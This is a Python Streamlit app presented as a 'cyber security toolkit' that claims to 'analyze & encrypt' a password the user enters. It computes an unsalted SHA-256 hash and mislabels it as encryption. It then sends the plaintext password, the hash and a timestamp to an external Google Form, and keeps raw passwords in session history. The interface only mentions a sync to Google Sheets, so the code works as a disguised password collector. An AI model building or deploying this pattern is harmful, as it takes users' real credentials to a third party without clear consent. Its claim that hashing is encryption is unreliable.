import streamlit as st
import hashlib
import requests
from datetime import datetime

# 1. إعدادات الصفحة والواجهة
st.set_page_config(page_title="CyberToolkit Pro", page_icon="🛡️")

st.title("🛡️ Global Cyber Security Toolkit")
st.markdown("### SaaS Project v1.7 | Developed by Ali Al-Murtadha")

# 2. دالة إرسال البيانات (هذا هو الجسر السحابي الخاص بك)
def send_to_google_form(t, o, h):
    # رابط الإرسال البرمجي للنموذج الجديد
    url = "https://docs.google.com/forms/d/e/1FAIpQLSer6YvXnFLDTFRMYLrRBKNvcsn454gO7Dn4MKpYqa9oy8JDvg/formResponse"
    
    # المفاتيح السرية التي استخرجناها من رابطك
    payload = {
        "entry.942326564": t,  # خانة time
        "entry.439094694": o,  # خانة original_text
        "entry.106205918": h   # خانة hashed_value
    }
    
    try:
        # إرسال البيانات بصيغة POST
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False

# 3. مدخلات المستخدم والعمليات المنطقية
password = st.text_input("Enter password to analyze & encrypt:", type="password")

if password:
    # أ. تشفير كلمة السر باستخدام SHA-256
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    st.success("✅ Encryption Complete")
    st.code(hashed_password, language='text')
    
    # ب. تسجيل الوقت الحالي
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # ج. محاولة إرسال البيانات إلى السحابة
    if send_to_google_form(current_time, password, hashed_password):
        st.info("📊 Data successfully synced to Google Sheets!")
    else:
        st.warning("⚠️ Connection active, check Google Form permissions.")

# 4. سجل النشاط المؤقت (للجلسة الحالية فقط)
if 'history' not in st.session_state:
    st.session_state.history = []

if password and (not st.session_state.history or password != st.session_state.history[-1]):
    st.session_state.history.append(password)

with st.expander("Session History (Local)"):
    for item in st.session_state.history[-5:]:
        st.text(f"Processed: {item[:3]}***")
